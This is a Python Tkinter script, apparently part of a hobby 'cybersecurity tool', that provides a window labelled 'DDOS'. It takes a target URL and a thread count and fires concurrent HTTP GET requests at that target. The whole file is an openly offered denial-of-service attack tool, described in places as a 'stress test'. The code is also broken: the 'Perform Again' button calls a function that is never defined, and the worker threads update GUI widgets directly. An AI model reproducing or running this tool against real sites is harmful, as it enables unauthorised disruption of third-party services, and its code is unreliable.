import threading
import requests
import tkinter as tk
from tkinter import ttk

def http_stress_test(target, output_text):
    try:
        response = requests.get(target)
        result = f"Request sent to {target}. Status code: {response.status_code}\n"
    except requests.exceptions.RequestException as e:
        result = f"Error: {e}\n"

    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, result)
    output_text.config(state=tk.DISABLED)

def on_start_button_click(target_entry, threads_entry, output_text):
    target_url = target_entry.get()

    try:
        threads = int(threads_entry.get())
    except ValueError:
        output_text.config(state=tk.NORMAL)
        output_text.insert(tk.END, "Threads count is incorrect!\n")
        output_text.config(state=tk.DISABLED)
        return

    if threads <= 0:
        output_text.config(state=tk.NORMAL)
        output_text.insert(tk.END, "Threads count should be greater than 0!\n")
        output_text.config(state=tk.DISABLED)
        return

    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, "\nStarting HTTP stress test...\n")
    output_text.config(state=tk.DISABLED)

    for i in range(threads):
        thread = threading.Thread(target=http_stress_test, args=(target_url, output_text))
        thread.start()

# Create the main window
def main():
    root = tk.Tk()
    root.title("DDOS")
    root.resizable(False, False)
    root.iconbitmap("D:\\Multipurpose Cybersecurity Tool\\Favicon\\DDOS.ico")

# Calculate the screen width and height
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

# Calculate the x and y coordinates to center the window
    x_coordinate = (screen_width - 500) // 2
    y_coordinate = (screen_height - 350) // 2

# Set the window to be centered on the screen
    root.geometry(f"500x350+{x_coordinate}+{y_coordinate}")

    # Create and place widgets
    target_label = ttk.Label(root, text="Enter the target URL (including http/https):")
    target_label.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)

    target_entry = ttk.Entry(root, width=30)
    target_entry.grid(row=0, column=1, padx=10, pady=5)

    threads_label = ttk.Label(root, text="Enter the number of threads:")
    threads_label.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)

    threads_entry = ttk.Entry(root, width=5)
    threads_entry.grid(row=1, column=1, padx=10, pady=5)

    start_button = ttk.Button(root, text="Perform DDOS", command=lambda: on_start_button_click(target_entry, threads_entry, output_text))
    start_button.grid(row=2, column=0, columnspan=2, pady=10)

    output_text = tk.Text(root, wrap=tk.WORD, width=50, height=10, state=tk.DISABLED)
    output_text.grid(row=3, column=0, columnspan=2, padx=10, pady=5)

    exit_button = ttk.Button(root, text="Exit", command=root.destroy)
    exit_button.grid(row=4, column=0, pady=10, sticky=tk.E)

    perform_again_button = ttk.Button(root, text="Perform Again", command=lambda: on_perform_again_button_click(target_entry, threads_entry, output_text))
    perform_again_button.grid(row=4, column=1, pady=10, sticky=tk.W)

    root.mainloop()

if __name__ == "__main__":
    main()
